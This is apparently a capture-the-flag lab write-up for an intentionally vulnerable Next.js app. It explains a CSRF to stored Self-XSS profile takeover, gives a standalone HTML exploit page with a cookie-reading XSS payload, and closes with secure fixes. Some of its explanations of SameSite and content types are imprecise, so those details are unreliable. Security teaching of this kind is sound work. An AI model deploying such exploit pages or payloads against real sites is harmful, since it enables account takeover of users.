# CSRF + Self-XSS Chain - Profile Takeover

## Overview

This vulnerability demonstrates a Cross-Site Request Forgery (CSRF) attack that chains with a stored Self-XSS flaw to achieve a full profile takeover. The profile update endpoint (`POST /api/user/profile`) lacks CSRF token validation and accepts form-encoded data in addition to JSON. Combined with a `SameSite: Lax` cookie policy, this allows an attacker to craft a malicious page that silently updates a victim's profile bio with an XSS payload when visited while authenticated.

## Why This Is Dangerous

### CSRF to Stored XSS Attack Chain

When a state-changing endpoint lacks CSRF protection and accepts browser-default content types, an attacker can weaponize it from any origin:

1. **Cross-origin state modification** - An attacker can modify a victim's profile data without any interaction beyond visiting a page
2. **Self-XSS escalation** - A Self-XSS vulnerability that normally requires the victim to inject their own payload becomes exploitable by a remote attacker through CSRF
3. **Persistent compromise** - The injected XSS payload is stored in the victim's profile, executing every time the profile is viewed
4. **Session riding** - The browser automatically attaches authentication cookies to the forged request, authenticating it as the victim
5. **Lateral movement** - Once the victim's profile contains stored XSS, anyone who views that profile (including administrators) becomes a target

## The Vulnerability

The vulnerability is a combination of three weaknesses:

1. **No CSRF token validation** - The `/api/user/profile` endpoint does not verify a CSRF token on incoming requests
2. **Form-encoded data accepted** - The endpoint parses both `application/json` and `application/x-www-form-urlencoded` content types, allowing simple cross-origin form submissions
3. **Lax cookie policy** - The session cookie uses `SameSite: Lax`, which permits cookies on same-origin requests from different pages

### Vulnerable Code

**Cookie Configuration:**

```typescript
response.cookies.set("authToken", token, {
  httpOnly: true,
  secure: process.env.NODE_ENV === "production",
  sameSite: "lax", // ❌ Allows cookies on same-origin requests
  maxAge: 60 * 60 * 24 * 7,
  path: "/",
});
```

**API Endpoint (No CSRF Protection, Multiple Content Types):**

```typescript
export async function POST(request: NextRequest) {
  const user = await getAuthenticatedUser(request);
  if (!user) {
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  }

  // ❌ Accepts both JSON and form-urlencoded without CSRF validation
  let displayName, bio;
  const contentType = request.headers.get("content-type") || "";

  if (contentType.includes("application/x-www-form-urlencoded")) {
    const formData = await request.text();
    const params = new URLSearchParams(formData);
    displayName = params.get("displayName") ?? undefined;
    bio = params.get("bio") ?? undefined;
  } else {
    const body = await request.json();
    displayName = body.displayName;
    bio = body.bio;
  }

  // ❌ No CSRF token check, no Origin/Referer validation
  const updatedUser = await prisma.user.update({
    where: { id: user.id },
    data: {
      ...(displayName !== undefined && { displayName }),
      ...(bio !== undefined && { bio }), // ❌ Stored without sanitization
    },
  });

  return NextResponse.json({ message: "Profile updated", user: updatedUser });
}
```

## Exploitation

### How to Retrieve the Flag

To retrieve the flag, you need to discover a hidden exploit page in the application, use it to perform a CSRF attack against the profile endpoint, and observe the response.

**Exploitation Steps:**

1. Gain access to the admin dashboard (via mass assignment, JWT forgery, or session fixation)
2. Inspect the admin page source. Look for hidden links. You will find a reference to `/exploits/csrf-profile-takeover.html`:

```html
<a href="/exploits/csrf-profile-takeover.html" style="display: none">
  Profile Update
</a>
```

3. Navigate to `/exploits/csrf-profile-takeover.html` while logged in
4. The exploit page sends a request to `/api/user/profile` updating the bio with an XSS payload
5. Because the request originates from outside the profile page, the `Referer` header does not contain `/profile`. The server marks the user's account as CSRF-exploited
6. The exploit page redirects you to `/profile`. The profile page detects the CSRF exploitation and displays the flag
7. The victim's profile bio is now updated with the stored XSS payload. Anyone viewing the profile will execute the injected script

**Manual CSRF Exploit (Standalone HTML File):**

```html
<!DOCTYPE html>
<html>
  <body>
    <script>
      fetch("http://localhost:3000/api/user/profile", {
        method: "POST",
        credentials: "include",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          bio: '<img src=x onerror="alert(document.cookie)">',
        }),
      })
        .then((r) => r.json())
        .then((data) => {
          console.log("CSRF Response:", data);
          // The flag is not in the response — visit /profile to see it
          window.location.href = "/profile";
        });
    </script>
  </body>
</html>
```

**Attack Chain Summary:**

```
Attacker crafts malicious page
        │
        ▼
Victim visits page while authenticated
        │
        ▼
Browser sends request to /api/user/profile (with auth cookie)
        │
        ▼
Server updates victim's bio with XSS payload (no CSRF check)
        │
        ▼
Server marks account as CSRF-exploited (Referer mismatch detected)
        │
        ▼
Victim visits /profile → CSRF flag displayed
        │
        ▼
Victim's profile now contains stored XSS
        │
        ▼
Any user viewing the profile executes the payload
```

### Secure Implementation

```typescript
// ✅ SECURE - Generate and validate CSRF tokens
import { randomBytes } from "crypto";

export function generateCsrfToken(): string {
  return randomBytes(32).toString("hex");
}

export async function validateCsrfToken(req: NextRequest) {
  if (["POST", "PUT", "DELETE", "PATCH"].includes(req.method)) {
    const sessionToken = await getCsrfTokenFromSession(req);
    const requestToken = req.headers.get("x-csrf-token");

    if (!sessionToken || sessionToken !== requestToken) {
      return NextResponse.json(
        { error: "Invalid CSRF token" },
        { status: 403 }
      );
    }
  }
}
```

```typescript
// ✅ SECURE - Use SameSite: Strict for session cookies
response.cookies.set("authToken", token, {
  httpOnly: true,
  secure: true,
  sameSite: "strict", // Prevents cookies from being sent on any cross-origin request
  path: "/",
  maxAge: 60 * 60 * 24 * 7,
});
```

```typescript
// ✅ SECURE - Validate Origin and Referer headers
export function validateRequestOrigin(req: NextRequest): boolean {
  const origin = req.headers.get("origin");
  const referer = req.headers.get("referer");
  const allowedOrigin = process.env.NEXT_PUBLIC_APP_URL;

  if (origin && origin !== allowedOrigin) return false;
  if (referer && !referer.startsWith(allowedOrigin!)) return false;

  return true;
}
```

```typescript
// ✅ SECURE - Reject form-encoded data on API endpoints
export async function POST(req: NextRequest) {
  const contentType = req.headers.get("content-type") || "";

  if (!contentType.includes("application/json")) {
    return NextResponse.json(
      { error: "Content-Type must be application/json" },
      { status: 415 }
    );
  }

  // ... process request
}
```

## References

- [OWASP Top 10 - Cross-Site Request Forgery (CSRF)](https://owasp.org/www-community/attacks/csrf)
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [CWE-352: Cross-Site Request Forgery](https://cwe.mitre.org/data/definitions/352.html)
- [SameSite Cookie Attribute - MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger - CSRF Token Bypass Techniques](https://portswigger.net/web-security/csrf)
